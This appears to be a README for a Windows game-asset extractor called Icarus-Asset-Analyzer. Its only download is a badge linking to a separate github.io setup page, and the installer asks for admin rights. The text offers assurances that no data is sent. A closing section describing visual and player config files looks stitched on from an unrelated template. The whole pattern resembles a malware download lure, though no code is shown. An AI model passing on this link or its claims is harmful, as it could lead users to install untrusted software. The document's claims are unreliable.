# Icarus‑Asset‑Analyzer
**Author:** MidnightPilotPonder
**Platform:** Windows 10 / 11 (desktop only)

---

## What is Icarus‑Asset‑Analyzer?

Icarus‑Asset‑Analyzer is a lightweight, open‑source Windows utility that lets you **extract**, **inspect**, and **manage** game assets bundled inside executable packages. Whether you’re a modder, a curious player, or a developer looking to audit resources, Icarus gives you a clear, graphical view of textures, audio, models, scripts and more—without needing the original development utility.

### Key capabilities

- **Deep extraction** – Pull out individual files from any supported package format.
- **Live preview** – View textures, audio clips, meshes and scripts directly inside the app.
- **Batch operations** – Rename, relocate or delete groups of assets in one click.
- **Metadata explorer** – See version info, compression details, and dependency trees.
- **Export toolbox** – Convert extracted assets to common formats (PNG, WAV, OBJ, etc.).

---

## Quick start

1. **Download** the latest build from the official page:

   <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download button"></a>

2. Run the installer (requires admin rights the first time).
3. Launch **Icarus‑Asset‑Analyzer** from the Start menu.
4. Drag‑and‑drop a game executable or package onto the main window, and watch the asset tree populate.

---

## Installation notes

- **Supported OS:** Windows 10 (1809 or newer) and Windows 11.
- **Dependencies:** .NET 6 runtime (installed automatically if missing).
- **Permissions:** The utility needs read access to the target files and write access to the output folder you choose.

---

## How to contribute

The project is licensed under the **MIT License** – feel free to fork, improve, and submit pull requests.

| Area | What you can do |
|------|-----------------|
| **Bug reports** | Open an issue with steps to reproduce and, if possible, a small sample file. |
| **Feature ideas** | Propose new import/export formats, UI tweaks, or automation scripts. |
| **Code** | The source lives in the `src/` folder; follow the existing coding style and run the unit tests before submitting. |
| **Documentation** | Polish the wiki, add screenshots for new features, or translate the README. |

---

## Frequently asked questions

**Q:** *Can I use Icarus on non‑gaming executables?*
**A:** Yes, the core extractor works on any PE file that contains embedded resources, but the UI is optimized for game‑related asset types.

**Q:** *Is there a command‑line version?*
**A:** A minimal CLI is planned for a future release. For now, the GUI covers most workflows efficiently.

**Q:** *Will my game data be uploaded anywhere?*
**A:** Absolutely not. All processing happens locally; the app never transmits your files.

---

## License

```
MIT License

Copyright (c) 2026 MidnightPilotPonder

Permission is hereby granted, free of charge, to any person obtaining a copy
...
```

---

**Happy asset hunting!** 🚀

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```